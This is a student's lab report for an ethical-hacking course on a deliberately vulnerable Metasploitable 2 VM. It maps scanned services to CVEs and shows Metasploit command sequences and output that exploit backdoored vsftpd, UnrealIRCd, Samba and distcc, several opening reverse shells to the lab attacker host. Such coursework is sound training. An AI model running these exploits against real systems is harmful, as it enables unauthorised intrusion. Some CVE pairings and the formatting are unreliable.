# Ethical Hacking Technologies
## Lab Work 4: Metadata and Vulnerabilities

**Student: Emre Yesilkaya**

### Legend
The information system is used to provide services. The network administrator has been less than diligent and has not updated services for a long time. This has made the services provided in the virtual environment vulnerable. 

### Goals
Identify the services running on the network and their versions. Find vulnerabilities in existing services and exploit them (hacking). The STUDENT fills in the results in the spaces marked "Your result." The STUDENT must fully describe at least two vulnerabilities and demonstrate (add screenshots in the report) how this was done.

### Working Tools
- An image of a virtual vulnerable Linux OS ([Metasploitable 2](http://sourceforge.net/projects/metasploitable/files/Metasploitable2/)) (login: msfadmin password: msfadmin).
- VMware Workstation Player ([free](https://www.vmware.com/products/workstation-player.html) or [Filehippo](https://filehippo.com/download_vmware-workstation-player/)).
- Wireshark - network traffic analysis software.
- Nmap / Nessus - tools for identifying network services, ports, and vulnerabilities.
- (optional) Kali Linux - for the self-employed, you can use the Pentest Linux distribution to have all the tools you need in one place ([Kali Linux](http://www.kali.org)). Importantly, if you are planning to use Windows OS, you can install the entire environment via the Windows App Store ([link to do so](https://www.kali.org/news/kali-linux-in-the-windows-app-store/)).
- Metasploit - a vulnerability testing system and a platform (framework) for developing security measures and vulnerability exploitation codes. It is used worldwide by many network security professionals for intrusion testing and by system administrators to check whether system updates and software updates are correctly installed. The system is developed using the Ruby programming language, and the outgoing components are written in various other languages such as C, Perl, assembler, etc. ([Metasploit](https://www.metasploit.com)). NOTE: If you use Kali Linux, the Metasploit framework is installed by default.
- Vulnerability Database ([Exploit Database](http://www.exploit-db.com)).
- Hydra - brute force tool ([GitHub - THC Hydra](https://github.com/vanhauser-thc/thc-hydra)).

### Additional Working Tools

| Name           | Short Description                                                                                         |
|----------------|-----------------------------------------------------------------------------------------------------------|
| SING           | a tool to change the various ICMP packet types                                                            |
| NESSUS         | Vulnerability scanner with add-ons                                                                        |
| Nmap / Netcat  | Versatile network connection scanning tool for UDP and TCP                                                |
| Whisker 2.0    | Network scanning tool written in PERL                                                                     |
| Nobody         | A more sophisticated network scanning tool based on Whisker                                               |
| Fragrouter     | Package replacing the NIDS checker tool                                                                   |
| Nemesis        | A package that wraps a tool for inspecting firewalls and routers                                          |
| Xprobe2        | Tool for fingerprint systems with ICMP                                                                    |
| John the Ripper / Hydra | Password Crack Tool                                                                               |
| Sqlmap         | SQL vulnerability injections                                                                              |
| Sqlninja       | SQL vulnerability injection exploit                                                                       |
| snmpwalk       | SNMP package tree                                                                                         |
| Hydra          | Brute force tool                                                                                          |

### Methodology for Carrying Out the Work
The work involves scanning the network and discovering service ports and their versions. Vulnerability versioning in the [NVD](http://nvd.nist.gov) vulnerability database. Vulnerability search in the Metasploit database. Vulnerability Exploitation.

### Performance Evaluation

| Student Assessment | Possible Maximum Evaluation Score | The Subject of the Evaluation                | Notes                   |
|--------------------|-----------------------------------|----------------------------------------------|-------------------------|
| 3                  |                                   | Basic information on IP address services (services) | Information about services versions ports |
| 5                  |                                   | The vulnerability described or demonstrated  | Vulnerability evidence found in the CVE database (minimum two vulnerabilities exploited) |
| 2                  |                                   | Information on service vulnerabilities was collected. Conclusions. | Information on vulnerabilities (vulnerability) |

### Tasks

#### Workflow. Scanning
During the lab, scan ONLY ONE IP. In the Service List table (Table 1) fill in the service information (Service, Port, etc.) for the scanned (Metaploitable Linux) address. Table 2 lists the vulnerable services. It is necessary to explain why you think the service may be compromised or exploitable.

**Use of Nmap / Nessus. Vulnerabilities detected in services: Searching CVE and Metasploit databases.**

**Your Result**

**List of Services (scanned IP address)**

**Table 1**

| Eil. No. | Port | Service          | Version                     | Vulnerability (CVE, EDB-ID)                      | Notes |
|----------|------|------------------|-----------------------------|--------------------------------------------------|-------|
| 1        | 21   | ftp              | vsftpd 2.3.4                | CVE-2011-2523, EDB-ID: 17491, EDB                |       |
| 2        | 22   | ssh              | OpenSSH 4.7p1 Debian 8ubuntu1 | CVE-2008-0166, EDB-ID: 5720, EDB                |       |
| 3        | 23   | telnet           | Linux telnetd               | None                                             |       |
| 4        | 25   | smtp             | Postfix smtpd               | None                                             |       |
| 5        | 53   | domain           | ISC BIND 9.4.2              | CVE-2009-0696, EDB-ID: 36044, EDB                |       |
| 6        | 80   | http             | Apache httpd 2.2.8 ((Ubuntu) DAV/2) | CVE-2009-1195, EDB-ID: 9207, EDB, CVE-2009-1890, EDB-ID: 9208, EDB |       |
| 7        | 111  | rpcbind          | 2 (RPC #100000)             | None                                             |       |
| 8        | 139  | netbios-ssn      | Samba smbd 3.X - 4.X        | CVE-2007-2447, EDB-ID: 16320, EDB                |       |
| 9        | 445  | netbios-ssn      | Samba smbd 3.X - 4.X        | CVE-2007-2447, EDB-ID: 16320, EDB                |       |
| 10       | 512  | exec             | netkit-rsh rexecd           | None                                             |       |
| 11       | 513  | login            | OpenBSD or Solaris rlogind  | None                                             |       |
| 12       | 514  | tcpwrapped       |                             | None                                             |       |
| 13       | 1099 | java-rmi         | GNU Classpath grmiregistry  | None                                             |       |
| 14       | 1524 | bindshell        | Metasploitable root shell   | None                                             |       |
| 15       | 2049 | nfs              | 2-4 (RPC #100003)           | None                                             |       |
| 16       | 2121 | ftp              | ProFTPD 1.3.1               | CVE-2010-4221, EDB-ID: 15449, EDB                |       |
| 17       | 3306 | mysql            | MySQL 5.0.51a-3ubuntu5      | CVE-2016-6662, EDB-ID: 41761, EDB                |       |
| 18       | 5432 | postgresql       | PostgreSQL DB 8.3.0 - 8.3.7 | None                                             |       |
| 19       | 5900 | vnc              | VNC (protocol 3.3)          | None                                             |       |
| 20       | 6000 | X11              | (access denied)             | None                                             |       |
| 21       | 6667 | irc              | UnrealIRCd 3.2.8.1          | CVE-2010-2075, EDB-ID: 13853, EDB                |       |
| 22       | 3632 | tcp              | DistCC Daemon               | CVE-2004-2687, EDB-ID: 39552, EDB                |       |

**List of Vulnerable Services**
Students identify the TOP five services most vulnerable to CVE ([NVD](https://nvd.nist.gov/vuln-metrics/cvss))

**Table 2**

| Port  | Protocol | Vulnerable Service | Vulnerable Service Details                      |
|-------|----------|--------------------|-------------------------------------------------|
| 21    | tcp      | vsftpd 2.3.4       | CVE-2011-2523                                   |
| 22    | tcp      | OpenSSH 4.7p1      | CVE-2008-0166, CVE-2016-20012                   |
| 80    | tcp      | Apache 2.2.8       | CVE-2009-1195, CVE-2009-1890                    |
| 139 445 | tcp    | Samba smbd 3.X-4.X | CVE-2007-2447                                   |
| 6667  | tcp      | UnrealIRCd 3.2.8.1 | CVE-2010-2075                                   |
| 3632  | tcp      | DistCC Daemon      | CVE-2004-2687                                   |

### Explanation of Vulnerabilities and Exploits

**Vulnerability [First]: vsftpd 2.3.4 (Port 21)**
CVE-2011-2523: vsftpd 2.3.4 has a backdoor that allows attackers to execute arbitrary code.

**Evidence of Exploit:
**
```shell
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.10.5
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.10.5:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.10.5:21 - USER: 331 Please specify the password.
[+] 192.168.10.5:21 - Backdoor service has been spawned handling...
[+] 192.168.10.5:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.10.4:45111 -> 192.168.10.5:6200) at 2024-05-18 16:01:24 -0400

Vulnerability [Second]: OpenSSH 4.7p1 (Port 22)
CVE-2008-0166: OpenSSH has a vulnerability in key generation.
CVE-2016-20012: OpenSSH user enumeration vulnerability.

Evidence of Exploit:msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 192.168.10.5
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /path/to/userlist.txt

Vulnerability [Third]: Samba smbd 3.X-4.X (Port 139 445)
CVE-2007-2447: Samba versions 3.0.0 to 3.0.25rc3 have a command injection vulnerability.

Evidence of Exploit:
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOST 192.168.10.5
msf6 exploit(multi/samba/usermap_script) > set RPORT 445
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.10.4
msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 192.168.10.4:4444 
[*] Command shell session 1 opened (192.168.10.4:4444 -> 192.168.10.5:50400) at 2024-05-18 16:21:11 -0400
Vulnerability [Fourth]: UnrealIRCd 3.2.8.1 (Port 6667)
CVE-2010-2075: UnrealIRCd 3.2.8.1 contains a backdoor that allows remote code execution.

Evidence of Exploit:
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.10.5
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.10.4
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP double handler on 192.168.10.4:4444 
[*] 192.168.10.5:6667 - Connected to 192.168.10.5:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.10.5:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo l9Iv1MQB8hXLLC27;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "l9Iv1MQB8hXLLC27\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.10.4:4444 -> 192.168.10.5:58257) at 2024-05-18 16:37:26 -0400
Vulnerability [Fifth]: DistCC Daemon (Port 3632)
CVE-2004-2687: DistCC Daemon contains a remote code execution vulnerability.

Evidence of Exploit:
msf6 > use exploit/unix/misc/distcc_exec
msf6 exploit(unix/misc/distcc_exec) > set RHOST 192.168.10.5
msf6 exploit(unix/misc/distcc_exec) > set RPORT 3632
msf6 exploit(unix/misc/distcc_exec) > set LHOST 192.168.10.4
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
msf6 exploit(unix/misc/distcc_exec) > exploit
[*] Started reverse TCP double handler on 192.168.10.4:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 1CDyuUd44ococlzz;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "1CDyuUd44ococlzz\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.10.4:4444 -> 192.168.10.5:47525) at 2024-05-18 18:19:05 -0400
Conclusion
This lab focused on identifying and exploiting vulnerabilities in a network using various tools like Nmap, Nessus, and Metasploit. The primary tasks included scanning services, identifying vulnerabilities, and demonstrating successful exploits. The findings provide insights into the importance of regular updates and patch management in maintaining network security.
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
